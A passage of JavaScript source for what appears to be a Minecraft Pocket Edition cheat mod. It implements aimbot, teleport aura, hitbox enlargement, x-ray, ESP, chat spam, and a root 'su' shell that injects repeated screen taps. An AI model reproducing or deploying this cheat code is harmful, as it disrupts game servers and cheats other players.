ModPE.showTipMessage(color+"\n                                                                                 X: "+x+", Y: "+y+", Z: "+z+"\n                                                                                 Yaw: "+yaw+" & Pitch: "+pitch+"\n                                                                                 "+world+", Time: "+time+"\n                                                                                 ("+item+":"+meta+")x"+count+" - "+Entity.getHealth(getPlayerEnt())+"<3\n                                                                                 eid: "+Shadow.getEid()+" & bid: "+Player.getPointedBlockId()+"\n                                                                                 "+armor+"\n                                                                                 Moving: "+imoved+" - "+compass+"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
} else {
ModPE.showTipMessage(color+"X: "+x+", Y: "+y+", Z: "+z+"\nYaw: "+yaw+" & Pitch: "+pitch+"\n"+world+", Time: "+time+"\n("+item+":"+meta+")x"+count+" - "+Entity.getHealth(getPlayerEnt())+"<3\neid: "+Shadow.getEid()+" & bid: "+Player.getPointedBlockId()+"\n"+armor+"\nMoving: "+imoved+" - "+compass);
}
}
if(autolog){
var ent = getNearestPlayer(aimrange + 2);
if(ent != null){
ModPE.leaveGame();
}
}
if(autopot){
var hearts = Entity.getHealth(getPlayerEnt());
if(hearts <= max*2){
let bestsword = [-1, -1];
for (let i = 0; i < 10; i++) {
let slot = Shadow.sortPots(Player.getInventorySlot(i), Player.getInventorySlotData(i));
if (slot > bestsword[0]) {
bestsword[0] = slot;
bestsword[1] = i;
}
if (bestsword[1] != -1){
Player.setSelectedSlotId(bestsword[1]);
setRot(getPlayerEnt(), getYaw(getPlayerEnt()), 90);
}
}
}
}
if(autofood){
var hearts = Entity.getHealth(getPlayerEnt());
if(hearts <= max*2){
let bestsword = [-1, -1];
for(let i = 0; i < 10; i++){
let slot = Shadow.sortFood(Player.getInventorySlot(i));
if(slot > bestsword[0]){
bestsword[0] = slot;
bestsword[1] = i;
}
if(bestsword[1] != -1){
Player.setSelectedSlotId(bestsword[1]);
}
}
}
}
if(jesus){
var x = getPlayerX();
var y = getPlayerY();
var z = getPlayerZ();
if(getTile(x, y - 2, z) == 8 || getTile(x, y - 2, z) == 11 || getTile(x, y - 2, z) == 9 || getTile(x, y - 2, z) == 10){
if (Entity.getVelX(Player.getEntity()) > 0.1) {
Entity.setVelY(Player.getEntity(), 0.2);
}
if (Entity.getVelX(Player.getEntity()) < -0.1) {
Entity.setVelY(Player.getEntity(), 0.2);
}
if (Entity.getVelZ(Player.getEntity()) > 0.1) {
Entity.setVelY(Player.getEntity(), 0.2);
}
if (Entity.getVelZ(Player.getEntity()) < -0.1) {
Entity.setVelY(Player.getEntity(), 0.2);
}
}
}
if(airwalk){
/*
-45 & 45 = +z
-135 & -44 = +x
131 & -134 = -z
45 & 130 = -x
*/
var x = getPlayerX();
var y = getPlayerY();
var z = getPlayerZ();
var yaw = Entity.getYaw(getPlayerEnt());
if(getTile(x, y -2, z) == 0){

if(getPitch() <= 20 && getPitch() >= -5){
y = y;
ModPE.showTipMessage(pre+"Air walk going straight.");
}
if(getPitch() >= 21){
y = y-1;
ModPE.showTipMessage(pre+"Air walk going down.");
}
if(getPitch() <= -6){
y = y+1;
ModPE.showTipMessage(pre+"Air walk going up.");
}
if(Shadow.yawDir(0, yaw)){
/*stand*/
Level.setTile(x, y -2, z, 95, 0);
/*back*/
Level.setTile(x, y -2, z-1, 95, 0);
/*front*/
Level.setTile(x, y -2, z+1, 95, 0);
Level.setTile(x, y -2, z+2, 95, 0);
/*left side*/
Level.setTile(x+1, y -2, z+1, 95, 0);
Level.setTile(x+1, y -2, z+2, 95, 0);
/*right side*/
Level.setTile(x-1, y -2, z+1, 95, 0);
Level.setTile(x-1, y -2, z+2, 95, 0);
}
if(Shadow.yawDir(1, yaw)){
/*stand*/
Level.setTile(x, y -2, z, 95, 0);
/*back*/
Level.setTile(x-1, y -2, z, 95, 0);
/*front*/
Level.setTile(x+1, y -2, z, 95, 0);
Level.setTile(x+2, y -2, z, 95, 0);
/*left side*/
Level.setTile(x+1, y -2, z+1, 95, 0);
Level.setTile(x+2, y -2, z+1, 95, 0);
/*right side*/
Level.setTile(x+1, y -2, z-1, 95, 0);
Level.setTile(x+2, y -2, z-1, 95, 0);
}
if(Shadow.yawDir(2, yaw)){
/*stand*/
Level.setTile(x, y -2, z, 95, 0);
/*back*/
Level.setTile(x, y -2, z+1, 95, 0);
/*front*/
Level.setTile(x, y -2, z-1, 95, 0);
Level.setTile(x, y -2, z-2, 95, 0);
/*left side*/
Level.setTile(x-1, y -2, z-1, 95, 0);
Level.setTile(x-1, y -2, z-2, 95, 0);
/*right side*/
Level.setTile(x+1, y -2, z-1, 95, 0);
Level.setTile(x+1, y -2, z-2, 95, 0);
}
if(Shadow.yawDir(3, yaw)){
/*stand*/
Level.setTile(x, y -2, z, 95, 0);
/*back*/
Level.setTile(x+1, y -2, z, 95, 0);
/*front*/
Level.setTile(x-1, y -2, z, 95, 0);
Level.setTile(x-2, y -2, z, 95, 0);
/*left side*/
Level.setTile(x-1, y -2, z-1, 95, 0);
Level.setTile(x-2, y -2, z-1, 95, 0);
/*right side*/
Level.setTile(x-1, y -2, z+1, 95, 0);
Level.setTile(x-2, y -2, z+1, 95, 0);
}

}
}
if(elevator){
var x = getPlayerX();
var y = getPlayerY();
var z = getPlayerZ();
var newY;
for (var blockY = -elevatorRange; blockY <= elevatorRange; blockY++) {
newY = y + blockY;
if(getTile(x, y-2, z) != 0){
if(getTile(x, newY-2, z) != 0 && getTile(x, newY, z) == 0) {
Entity.setPosition(Player.getEntity(), x, newY+1, z);
}
}
}
}
if(twerk)doTwerk();
if(phase){
var x = getPlayerX();
var y = getPlayerY();
var z = getPlayerZ();
if(Entity.isSneaking(getPlayerEnt())){

if(getTile(x+1, y-1, z) > 0){
Entity.setCollisionSize(getPlayerEnt(), 0, 0);
setVelY(getPlayerEnt(), 0.1);
} else {
Entity.setCollisionSize(getPlayerEnt(), 1, 1);
}
if(getTile(x-1, y-1, z) > 0){
Entity.setCollisionSize(getPlayerEnt(), 0, 0);
setVelY(getPlayerEnt(), 0.1);
} else {
Entity.setCollisionSize(getPlayerEnt(), 1, 1);
}
if(getTile(x, y-1, z+1) > 0){
Entity.setCollisionSize(getPlayerEnt(), 0, 0);
setVelY(getPlayerEnt(), 0.1);
} else {
Entity.setCollisionSize(getPlayerEnt(), 1, 1);
}
if(getTile(x, y-1, z-1) > 0){
Entity.setCollisionSize(getPlayerEnt(), 0, 0);
setVelY(getPlayerEnt(), 0.1);
} else {
Entity.setCollisionSize(getPlayerEnt(), 1, 1);
}

}
}
if(vel){
var velX = Entity.getVelX(getPlayerEnt());
var velY = Entity.getVelY(getPlayerEnt());
var velZ = Entity.getVelZ(getPlayerEnt());
ModPE.showTipMessage(velX+"\n"+velY+"\n"+velZ);
}
if(sprint){
Shadow.toDirectionalVector(pdir, (getYaw() + 90) * Shadow.deg_to_rad(), getPitch() * Shadow.deg_to_rad() * -1);
setVelX(getPlayerEnt(), 0.26 * pdir[0]);
setVelZ(getPlayerEnt(), 0.26 * pdir[2]);
}
if(autobreak){
var x = Player.getPointedBlockX();
var y = Player.getPointedBlockY();
var z = Player.getPointedBlockZ();
if(Level.getTile(x, y, z) != 0)Level.destroyBlock(x, y, z, true);
}
if(nuke){
var x = Player.getX();
var y = Player.getY();
var z = Player.getZ();
Level.destroyBlock(x, y-2, z, false);
Level.destroyBlock(x+1, y-2, z, false);
Level.destroyBlock(x, y-2, z+1, false);
Level.destroyBlock(x-1, y-2, z, false);
Level.destroyBlock(x, y-2, z-1, false);
Level.destroyBlock(x, y-3, z, false);
}
if(mobaim){
var ent = getNearestEntity(aimrange);
if(ent != null)crosshairAimAt(ent);
}
if(armoresp){
var ent = Player.getPointedEntity();
ModPE.showTipMessage("Helmet: "+Shadow.handleArmor(ent, 0)+"\nChest: "+Shadow.handleArmor(ent, 1)+"\nPants: "+Shadow.handleArmor(ent, 2)+"\nBoots: "+Shadow.handleArmor(ent, 3)+"\n");
}
if(highjump) {
if(Entity.getVelY(getPlayerEnt()) < -0.1){
setVelY(getPlayerEnt(), "-"+0+"."+jumpheight);
}
if(Entity.getVelY(getPlayerEnt()) < 0.35 && Entity.getVelY(getPlayerEnt()) > 0.2 && can == 1){
setVelY(getPlayerEnt(), 0+"."+jumpheight);
can = 2;
}
if(Entity.getVelY(getPlayerEnt()) > gravity && can == 2){
can = 0;
}
if(Entity.getVelY(getPlayerEnt()) == gravity && can == 0){
can = 1;
}
}
if(sneakaura){
var ent = getNearestPlayer(aimrange);
if(ent != null){
var name = Entity.getNameTag(ent);
if(Shadow.isFriend(Shadow.clean(name)) == false)Entity.setSneaking(getPlayerEnt(), true);
}
}
if(tpaura){
var ent = getNearestPlayer(aimrange);
if(ent != null && ent != getPlayerEnt() && Entity.getY(ent) != 0){
var x = Math.floor(Entity.getX(ent));
var y = Entity.getY(ent);
var z = Math.floor(Entity.getZ(ent));
if(checkslapper == false)Entity.setPosition(Player.getEntity(), x, y, z);
if(checkslapper == true){
if(Shadow.slapper(ent))Entity.setPosition(Player.getEntity(), x, y, z);
}
}
}
if(hover){
var ent = getNearestPlayer(aimrange);
if(ent != null && ent != getPlayerEnt() && Entity.getY(ent) != 0){
var x = Math.floor(Entity.getX(ent));
var y = Entity.getY(ent);
var z = Math.floor(Entity.getZ(ent));
if(checkslapper == false)Entity.setPosition(Player.getEntity(), x, y+1.62, z);
if(checkslapper == true){
if(Shadow.slapper(ent))Entity.setPosition(Player.getEntity(), x, y+1.62, z);
}
}
}
if(crouch){
if(Entity.isSneaking(getPlayerEnt())){
/*
-45 & 45 = +z
-135 & -44 = +x
131 & -134 = -z
45 & 130 = -x
*/
var yaw = Entity.getYaw(getPlayerEnt());
var ent = getPlayerEnt();
var x = Player.getPointedBlockX();
var y = Entity.getY(ent);
var z = Player.getPointedBlockZ();
if(Shadow.yawDir(0, yaw))Entity.setPosition(Player.getEntity(), x, y, z+1);
if(Shadow.yawDir(1, yaw))Entity.setPosition(Player.getEntity(), x+1, y, z);
if(Shadow.yawDir(2, yaw))Entity.setPosition(Player.getEntity(), x, y, z-1);
if(Shadow.yawDir(3, yaw))Entity.setPosition(Player.getEntity(), x-1, y, z);
}
}
if(xray)xrays();

if(multiaim){
var ent = getRandPlayer(aimrange);
if(ent != null){

var name = Entity.getNameTag(ent);
if(lockon)ModPE.showTipMessage(Shadow.clean(name)+"\nIs friend: "+Shadow.isFriend(Shadow.clean(name)));
if(checkslapper == false){
if(Shadow.isFriend(Shadow.clean(name)) == false)crosshairAimAt(ent);
} else {
if (Shadow.slapper(ent)){
if(Shadow.isFriend(Shadow.clean(name)) == false)crosshairAimAt(ent);
}
}
var x = Entity.getX(getPlayerEnt());
var y = Entity.getY(getPlayerEnt());
var z = Entity.getZ(getPlayerEnt());
var x2 = Entity.getX(ent);
var y2 = Entity.getY(ent);
var z2 = Entity.getZ(ent);
if(getTile(x, y, z) > 0 || getTile(x, y-1, z) > 0){
if(getTile(x, y, z) != 8 || getTile(x, y-1, z) != 8){
if(getTile(x, y, z) != 9 || getTile(x, y-1, z) != 9){
Entity.setPosition(Player.getEntity(), x2, y2+1, z2);
}}}

}
}
if(blockhunt){
var ent = getNearestEntity(aimrange+2);
if(ent != null){
if (Entity.getEntityTypeId(ent) == 39 || Entity.getEntityTypeId(ent) == 66)crosshairAimAt(ent);

var x = Entity.getX(getPlayerEnt());
var y = Entity.getY(getPlayerEnt());
var z = Entity.getZ(getPlayerEnt());
var x2 = Entity.getX(ent);
var y2 = Entity.getY(ent);
var z2 = Entity.getZ(ent);
if(getTile(x, y, z) > 0 || getTile(x, y-1, z) > 0){
if(getTile(x, y, z) != 8 || getTile(x, y-1, z) != 8){
if(getTile(x, y, z) != 9 || getTile(x, y-1, z) != 9){
Entity.setPosition(Player.getEntity(), x2, y2+1, z2);
}}}

}
}
if(esp1){
entry = getPlayerEnt();
players = Server.getAllPlayers();
}
if(esp3){
entry = getPlayerEnt();
for(var i = 0; i < Entity.getAll(); i++){
var x = Entity.getX(Entity.getAll()[i]);
var y = Entity.getY(Entity.getAll()[i]);
var z = Entity.getZ(Entity.getAll()[i]);
if(Entity.getEntityTypeId(Entity.getAll()[i]) != 63 && Entity.getAll()[i] != getPlayerEnt())mobs.push([x, y, z]);
}
}
if(esp4){
entry = getPlayerEnt();
for(var i = 0; i < Entity.getAll(); i++){
var x = Entity.getX(Entity.getAll()[i]);
var y = Entity.getY(Entity.getAll()[i]);
var z = Entity.getZ(Entity.getAll()[i]);
if(Entity.getEntityTypeId(Entity.getAll()[i]) != 63 && Entity.getEntityTypeId(Entity.getAll()[i]) == 64 && Entity.getAll()[i] != getPlayerEnt())items.push([x, y, z]);
}
}

}

function brightness(){
for(var i = 0; i < 217; i++){
if(bright)Block.setLightLevel(i, 1000);
}
ModPE.resetImages();
}

function xrays(){
for(var i = 0; i < 25; i++){
if(xray)Block.setRenderLayer(i, 1);
Block.setRenderLayer(78, 1);
}
ModPE.resetImages();
}

var t = 0;
function doTwerk() {
t++;
if(t == 1)Entity.setSneaking(getPlayerEnt(), true);
if(t == 3)Entity.setSneaking(getPlayerEnt(), false);
if(t == 5)t = 0;
}

function screenChangeHook(screenName){
if(screenName.match("pause_screen") || screenName.includes("pause_screen")){
/*seecret ? seecret = false : seecret = true;
Shadow.panic(seecret);*/
}
if(screenName.match("disconnect_screen") || screenName.includes("disconnect_screen")){
ModPE.setGameSpeed(20);
aimbot = false;
airwalk = false;
autowalk = false;
chestesp = false;
find = false;
hitbox = false;
hud = false;
spam = false;
tpaura = false;
checkslapper = false;
pdir = [0,0,0];
sec = 1;
text = "";
que = false;
rainbow = false;
ghost = false;
twerk = false;
}
if(screenName.match("progress_screen") || screenName.includes("progress_screen")){
dragop.Render.init();
}
}

function fastEat(bol){
if(bol){
/*apple*/
Item.setProperties(260, {"use_duration": 1,"food": {"nutrition": 4,"saturation_modifier": "low","is_meat": false}});
/*golden*/
Item.setProperties(322, {"stack_by_data": true,"use_duration": 1,"foil": false,"food": {"nutrition": 4,"saturation_modifier": "supernatural","is_meat": false,"effects": [{"name": "regeneration","chance": 1.0,"duration": 5,"amplifier": 1},{"name": "absorption","chance": 1.0,"duration": 120,"amplifier": 0}],"enchanted_effects": [{"name": "regeneration","chance": 0.66,"duration": 30,"amplifier": 4},{"name": "absorption","chance": 0.66,"duration": 120,"amplifier": 0},{"name": "resistance","chance": 0.66,"duration": 300,"amplifier": 0},{"name": "fire_resistance","chance": 0.66,"duration": 300,"amplifier": 0}]}});
/*gapple*/
Item.setProperties(466, {"hand_equipped": false,"stack_by_data": true,"use_duration": 1,"foil": true,"hover_text_color": "light_purple","food": {"nutrition": 4,"saturation_modifier": "supernatural","is_meat": false,"effects": [{"name": "regeneration","chance": 1.0,"duration": 30,"amplifier": 4},{"name": "absorption","chance": 1.0,"duration": 120,"amplifier": 3},{"name": "resistance","chance": 1.0,"duration": 300,"amplifier": 0},{"name": "fire_resistance","chance": 1.0,"duration": 300,"amplifier": 0}]}});
Item.setProperties(260, {"use_duration": 1,"max_stack_size": 1,"food": {"nutrition": 6,"saturation_modifier": "normal","is_meat": false,"using_converts_to": "bowl"}});
/*bread*/
Item.setProperties(297, {"use_duration": 1,"food": {"nutrition": 5,"saturation_modifier":"normal","is_meat": false}});
/*porkchop*/
Item.setProperties(319, {"use_duration": 1,"food": {"nutrition": 3,"saturation_modifier": "low","is_meat": true}});
/*cooked*/
Item.setProperties(320, {"use_duration": 1,"food": {"nutrition": 8,"saturation_modifier": "good","is_meat": true}});
/*fish*/
Item.setProperties(349, {"use_duration": 1,"max_damage": 0,"stacked_by_data": true,"food": {"nutrition": 2,"saturation_modifier": "poor","is_meat": true}});
/*salmon*/
Item.setProperties(460, {"use_duration": 1,"max_damage": 0,"stacked_by_data": true,"food": {"nutrition": 2,"saturation_modifier":"poor","is_meat": true}});
/*clown*/
Item.setProperties(461, {"use_duration": 1,"max_damage": 0,"stacked_by_data": true,"food": {"nutrition": 1,"saturation_modifier": "poor","is_meat": true}});
/*puffer*/
Item.setProperties(462, {"use_duration": 1,"max_damage": 0,"stacked_by_data": true,"food": {"nutrition": 1,"saturation_modifier": "poor","is_meat": true,"effects": [{"name": "poison","duration": 60,"amplifier": 3},{"name":"nausea","duration": 15,"amplifier": 1},{"name": "hunger","duration": 15,"amplifier": 2}]}});
/*cooked*/
Item.setProperties(350, {"use_duration":1,"max_damage":0,"stacked_by_data": true,"food":{"nutrition":5,"saturation_modifier":"normal","eat_sound":"random.burp","is_meat": true}});
/*cookedsalmon*/
Item.setProperties(463, {"use_duration":1,"max_damage":0,"stacked_by_data": true,"food":{"nutrition":6,"saturation_modifier":"good","is_meat": true}});
/*cookie*/
Item.setProperties(360, {"use_duration":1,"food":{"nutrition":2,"saturation_modifier":"poor","is_meat": false}});
/*melon*/
Item.setProperties(357, {"use_duration":1,"food":{"nutrition":2,"saturation_modifier":"low","is_meat": false}});
/*beef*/
Item.setProperties(363, {"use_duration":1,"food":{"nutrition":3,"saturation_modifier":"low","is_meat": true}});
/*cooked*/
Item.setProperties(364, {"use_duration":1,"food":{"nutrition":8,"saturation_modifier":"good","is_meat": true}});
/*chicken*/
Item.setProperties(365, {"use_duration":1,"food":{"nutrition":2,"saturation_modifier":"low","is_meat": true,"effects":[{"name":"hunger","chance":0.3,"duration":30,"amplifier":0}]}});
/*cooked*/
Item.setProperties(366, {"use_duration":1,"food":{"nutrition":6,"saturation_modifier":"normal","is_meat": true}});
/*mutton*/
Item.setProperties(423, {"use_duration":1,"food":{"nutrition":2,"saturation_modifier":"low","is_meat": true}});
/*cooked*/
Item.setProperties(424, {"use_duration":1,"food":{"nutrition":6,"saturation_modifier":"good","is_meat": true}});
/*flesh*/
Item.setProperties(367, {"use_duration":1,"food":{"nutrition":4,"saturation_modifier":"poor","is_meat": true,"effects":[{"name":"hunger","chance":0.8,"duration":30,"amplifier":0}]}});
/*spider*/
Item.setProperties(375, {"use_duration":1,"food":{"nutrition":2,"saturation_modifier":"good","is_meat": false,"effects":[{"name":"poison","chance":1.0,"duration":5,"amplifier":0}]}});
/*carrot*/
Item.setProperties(391, {"use_duration":1,"food":{"nutrition":3,"saturation_modifier":"normal","is_meat": false},"seed":{"crop_result":"carrots","plant_at":"farmland"}});
/*potato*/
Item.setProperties(392, {"use_duration":1,"food":{"nutrition":1,"saturation_modifier":"low","is_meat": false},"seed":{"crop_result":"potatoes","plant_at":"farmland"}});
/*baked*/
Item.setProperties(393, {"use_duration":1,"food":{"nutrition":5,"saturation_modifier":"normal","is_meat": false}});
/*poisonpotato*/
Item.setProperties(394, {"use_duration":1,"food":{"nutrition":2,"saturation_modifier":"low","is_meat": false,"effects":[{"name":"poison","chance":0.6,"duration":5,"amplifier":0}]}});
/*golden*/
Item.setProperties(396, {"use_duration":1,"food":{"nutrition":6,"saturation_modifier":"supernatural","is_meat": false}});
/*pumpkin*/
Item.setProperties(400, {"use_duration":1,"food":{"nutrition":8,"saturation_modifier":"low","is_meat": false}});
/*rabbit*/
Item.setProperties(411, {"use_duration":1,"food":{"nutrition":3,"saturation_modifier":"low","is_meat": true}});
/*cooked*/
Item.setProperties(412, {"use_duration":1,"food":{"nutrition":5,"saturation_modifier":"normal","is_meat": true}});
/*stew*/
Item.setProperties(413, {"use_duration":1,"max_stack_size":1,"food":{"nutrition":10,"saturation_modifier":"normal","using_converts_to":"bowl","is_meat": true}});
/*beetroot*/
Item.setProperties(459, {"use_duration":1,"food":{"nutrition":1,"saturation_modifier":"normal","is_meat": false}});
/*soup*/
Item.setProperties(280, {"id":203,"use_duration":1,"max_stack_size":1,"food":{"nutrition":6,"saturation_modifier":"normal","using_converts_to":"bowl","is_meat": false}});
} else {
/*apple*/
Item.setProperties(260, {"use_duration": 32,"food": {"nutrition": 4,"saturation_modifier": "low","is_meat": false}});
/*golden*/
Item.setProperties(322, {"stack_by_data": true,"use_duration": 32,"foil": false,"food": {"nutrition": 4,"saturation_modifier": "supernatural","is_meat": false,"effects": [{"name": "regeneration","chance": 1.0,"duration": 5,"amplifier": 1},{"name": "absorption","chance": 1.0,"duration": 120,"amplifier": 0}],"enchanted_effects": [{"name": "regeneration","chance": 0.66,"duration": 30,"amplifier": 4},{"name": "absorption","chance": 0.66,"duration": 120,"amplifier": 0},{"name": "resistance","chance": 0.66,"duration": 300,"amplifier": 0},{"name": "fire_resistance","chance": 0.66,"duration": 300,"amplifier": 0}]}});
/*gapple*/
Item.setProperties(466, {"hand_equipped": false,"stack_by_data": true,"use_duration": 32,"foil": true,"hover_text_color": "light_purple","food": {"nutrition": 4,"saturation_modifier": "supernatural","is_meat": false,"effects": [{"name": "regeneration","chance": 1.0,"duration": 30,"amplifier": 4},{"name": "absorption","chance": 1.0,"duration": 120,"amplifier": 3},{"name": "resistance","chance": 1.0,"duration": 300,"amplifier": 0},{"name": "fire_resistance","chance": 1.0,"duration": 300,"amplifier": 0}]}});
Item.setProperties(260, {"use_duration": 32,"max_stack_size": 1,"food": {"nutrition": 6,"saturation_modifier": "normal","is_meat": false,"using_converts_to": "bowl"}});
/*bread*/
Item.setProperties(297, {"use_duration": 32,"food": {"nutrition": 5,"saturation_modifier":"normal","is_meat": false}});
/*porkchop*/
Item.setProperties(319, {"use_duration": 32,"food": {"nutrition": 3,"saturation_modifier": "low","is_meat": true}});
/*cooked*/
Item.setProperties(320, {"use_duration": 32,"food": {"nutrition": 8,"saturation_modifier": "good","is_meat": true}});
/*fish*/
Item.setProperties(349, {"use_duration": 32,"max_damage": 0,"stacked_by_data": true,"food": {"nutrition": 2,"saturation_modifier": "poor","is_meat": true}});
/*salmon*/
Item.setProperties(460, {"use_duration": 32,"max_damage": 0,"stacked_by_data": true,"food": {"nutrition": 2,"saturation_modifier":"poor","is_meat": true}});
/*clown*/
Item.setProperties(461, {"use_duration": 32,"max_damage": 0,"stacked_by_data": true,"food": {"nutrition": 1,"saturation_modifier": "poor","is_meat": true}});
/*puffer*/
Item.setProperties(462, {"use_duration": 32,"max_damage": 0,"stacked_by_data": true,"food": {"nutrition": 1,"saturation_modifier": "poor","is_meat": true,"effects": [{"name": "poison","duration": 60,"amplifier": 3},{"name":"nausea","duration": 15,"amplifier": 1},{"name": "hunger","duration": 15,"amplifier": 2}]}});
/*cooked*/
Item.setProperties(350, {"use_duration": 32,"max_damage":0,"stacked_by_data": true,"food":{"nutrition":5,"saturation_modifier":"normal","eat_sound":"random.burp","is_meat": true}});
/*cookedsalmon*/
Item.setProperties(463, {"use_duration": 32,"max_damage":0,"stacked_by_data": true,"food":{"nutrition":6,"saturation_modifier":"good","is_meat": true}});
/*cookie*/
Item.setProperties(360, {"use_duration": 32,"food":{"nutrition":2,"saturation_modifier":"poor","is_meat": false}});
/*melon*/
Item.setProperties(357, {"use_duration": 32,"food":{"nutrition":2,"saturation_modifier":"low","is_meat": false}});
/*beef*/
Item.setProperties(363, {"use_duration": 32,"food":{"nutrition":3,"saturation_modifier":"low","is_meat": true}});
/*cooked*/
Item.setProperties(364, {"use_duration": 32,"food":{"nutrition":8,"saturation_modifier":"good","is_meat": true}});
/*chicken*/
Item.setProperties(365, {"use_duration": 32,"food":{"nutrition":2,"saturation_modifier":"low","is_meat": true,"effects":[{"name":"hunger","chance":0.3,"duration":30,"amplifier":0}]}});
/*cooked*/
Item.setProperties(366, {"use_duration": 32,"food":{"nutrition":6,"saturation_modifier":"normal","is_meat": true}});
/*mutton*/
Item.setProperties(423, {"use_duration": 32,"food":{"nutrition":2,"saturation_modifier":"low","is_meat": true}});
/*cooked*/
Item.setProperties(424, {"use_duration": 32,"food":{"nutrition":6,"saturation_modifier":"good","is_meat": true}});
/*flesh*/
Item.setProperties(367, {"use_duration": 32,"food":{"nutrition":4,"saturation_modifier":"poor","is_meat": true,"effects":[{"name":"hunger","chance":0.8,"duration":30,"amplifier":0}]}});
/*spider*/
Item.setProperties(375, {"use_duration": 32,"food":{"nutrition":2,"saturation_modifier":"good","is_meat": false,"effects":[{"name":"poison","chance":1.0,"duration":5,"amplifier":0}]}});
/*carrot*/
Item.setProperties(391, {"use_duration": 32,"food":{"nutrition":3,"saturation_modifier":"normal","is_meat": false},"seed":{"crop_result":"carrots","plant_at":"farmland"}});
/*potato*/
Item.setProperties(392, {"use_duration": 32,"food":{"nutrition":1,"saturation_modifier":"low","is_meat": false},"seed":{"crop_result":"potatoes","plant_at":"farmland"}});
/*baked*/
Item.setProperties(393, {"use_duration": 32,"food":{"nutrition":5,"saturation_modifier":"normal","is_meat": false}});
/*poisonpotato*/
Item.setProperties(394, {"use_duration": 32,"food":{"nutrition":2,"saturation_modifier":"low","is_meat": false,"effects":[{"name":"poison","chance":0.6,"duration":5,"amplifier":0}]}});
/*golden*/
Item.setProperties(396, {"use_duration": 32,"food":{"nutrition":6,"saturation_modifier":"supernatural","is_meat": false}});
/*pumpkin*/
Item.setProperties(400, {"use_duration": 32,"food":{"nutrition":8,"saturation_modifier":"low","is_meat": false}});
/*rabbit*/
Item.setProperties(411, {"use_duration": 32,"food":{"nutrition":3,"saturation_modifier":"low","is_meat": true}});
/*cooked*/
Item.setProperties(412, {"use_duration": 32,"food":{"nutrition":5,"saturation_modifier":"normal","is_meat": true}});
/*stew*/
Item.setProperties(413, {"use_duration": 32,"max_stack_size":1,"food":{"nutrition":10,"saturation_modifier":"normal","using_converts_to":"bowl","is_meat": true}});
/*beetroot*/
Item.setProperties(459, {"use_duration": 32,"food":{"nutrition":1,"saturation_modifier":"normal","is_meat": false}});
/*soup*/
Item.setProperties(280, {"id":203,"use_duration": 32,"max_stack_size":1,"food":{"nutrition":6,"saturation_modifier":"normal","using_converts_to":"bowl","is_meat": false}});
}
}

function draw(newX2,newY2,newZ2){
if(checkX.indexOf(parseInt(newX2)) == -1 && checkZ.indexOf(parseInt(newZ2)) == -1){
chests.push([newX2,newY2,newZ2]);
checkX.push(parseInt(newX2));
checkZ.push(parseInt(newZ2));
}
}

var checkX = ["."];
var checkZ = ["."];
var pool;
pool = java.util.concurrent.Executors.newScheduledThreadPool(1);
pool.setKeepAliveTime(1, java.util.concurrent.TimeUnit.MILLISECONDS);
pool.allowCoreThreadTimeOut(true);

function noLagTick(){
try{
pool.schedule(new java.lang.Runnable(function(){
android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_BACKGROUND);
if(esp2){

var x = getPlayerX();
var y = getPlayerY();
var z = getPlayerZ();
var newX;
var newY;
var newZ;
for(var blockX = -40; blockX <= 40; blockX++) {
for(var blockY = -70; blockY <= 70; blockY++) {
for(var blockZ = -40; blockZ <= 40; blockZ++) {
newX = x + blockX;
newY = y + blockY;
newZ = z + blockZ;
if(getTile(newX, newY, newZ) == tblock){
draw(newX,newY,newZ);
}
}
}
}

}
if(chestesp){

var x2 = getPlayerX();
var y2 = getPlayerY();
var z2 = getPlayerZ();
var newX3;
var newY3;
var newZ3;
for (var blockX2 = -chestTracersRange; blockX2 <= chestTracersRange; blockX2++) {
for (var blockY2 = -chestTracersRange; blockY2 <= chestTracersRange; blockY2++) {
for (var blockZ2 = -chestTracersRange; blockZ2 <= chestTracersRange; blockZ2++) {
newX3 = x2 + blockX2;
newY3 = y2 + blockY2;
newZ3 = z2 + blockZ2;
if (getTile(newX3, newY3, newZ3) == tblock) {
Shadow.draw(newX3, newY3, newZ3, chestTracersGroundMode == "on" ? true : false);
}
}
}
}

}
if(hitbox){
var ent = getNearestPlayer(aimrange+2);
if(ent != getPlayerEnt())Entity.setCollisionSize(ent, shadow1X, shadow1Y);
}
if (aimbot) {
var ent = getNearestPlayer(aimrange);
if(ent != null){

var name = Entity.getNameTag(ent);
if(lockon)ModPE.showTipMessage(Shadow.clean(name)+"\nIs friend: "+Shadow.isFriend(Shadow.clean(name)));
if(checkslapper == false){
if(Shadow.isFriend(Shadow.clean(name)) == false)crosshairAimAt(ent);
} else {
if (Shadow.slapper(ent)){
if(Shadow.isFriend(Shadow.clean(name)) == false)crosshairAimAt(ent);
}
}
var x = Entity.getX(getPlayerEnt());
var y = Entity.getY(getPlayerEnt());
var z = Entity.getZ(getPlayerEnt());
var x2 = Entity.getX(ent);
var y2 = Entity.getY(ent);
var z2 = Entity.getZ(ent);
if(getTile(x, y, z) > 0 || getTile(x, y-1, z) > 0){
if(getTile(x, y, z) != 8 || getTile(x, y-1, z) != 8){
if(getTile(x, y, z) != 9 || getTile(x, y-1, z) != 9){
Entity.setPosition(Player.getEntity(), x2, y2+1, z2);
}}}

}
}
eval(noLagTick());
}), 1, java.util.concurrent.TimeUnit.NANOSECONDS);
}catch(error){
print(error);
}
}
noLagTick();

function harder(){
MainActivity.runOnUiThread(new java.lang.Runnable({
run: function () {
try {
var process = java.lang.Runtime.getRuntime().exec("su");
var os = new java.io.DataOutputStream(process.getOutputStream());
var cmd = "/system/bin/input tap 0 0\n";
for(var i = 0; i < 800; i++){
os.writeBytes(cmd);
os.writeBytes("exit\n");
os.flush();
os.close();
}
} catch(error) {
clientMessage(error+"");
}
}
}));
}

var pool2;
if(pool2 != null){
pool2.shutdownNow();
}
pool2 = java.util.concurrent.Executors.newScheduledThreadPool(2);
pool2.setKeepAliveTime(1, java.util.concurrent.TimeUnit.NANOSECONDS);
pool2.allowCoreThreadTimeOut(true);

function noLagTick2(){
try{
pool2.schedule(new java.lang.Runnable(function(){
android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_BACKGROUND);
/*if(autoclick)tap();*/
if(tropic)harder();
eval(noLagTick2());
}), 1, java.util.concurrent.TimeUnit.NANOSECONDS);
}catch(error){
print(error);
}
}
noLagTick2();

function rptask2() {
ctx.runOnUiThread(new java.lang.Runnable({
run: function () {
new android.os.Handler()
.postDelayed(new java.lang.Runnable({
run: function () {
if(que){
if(sp0)Server.sendChat("" + text + "");
